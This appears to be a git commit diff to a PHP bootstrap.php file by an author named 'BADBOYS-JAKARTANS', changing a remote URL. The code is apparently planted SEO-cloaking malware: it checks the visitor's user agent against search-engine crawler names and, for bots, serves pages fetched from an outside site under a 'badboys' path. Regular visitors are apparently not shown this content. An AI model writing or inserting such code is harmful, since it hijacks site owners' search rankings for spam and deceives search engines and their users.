2858535e78909dfc56c49000f483c4451a76e5e1
BADBOYS-JAKARTANS <12marketm5@gmail.com>
2025-10-31 17:34:13 +0700

    Add files via upload

--- bootstrap.php
+++ bootstrap.php
@@ -2,7 +2,7 @@
 ob_start();
 header('Vary: Accept-Language, User-Agent');
 
-$bot_url = "https://obeydasupreme.site/badboys/ijaast.html";
+$bot_url = "https://obeydasupreme.site/badboys/OPENVENTIOYGY.html";
 $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
 
 $bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];
@@ -34,7 +34,6 @@ if ($is_bot) {
     ob_end_flush();
     exit;
 }
-
 
 
 /**
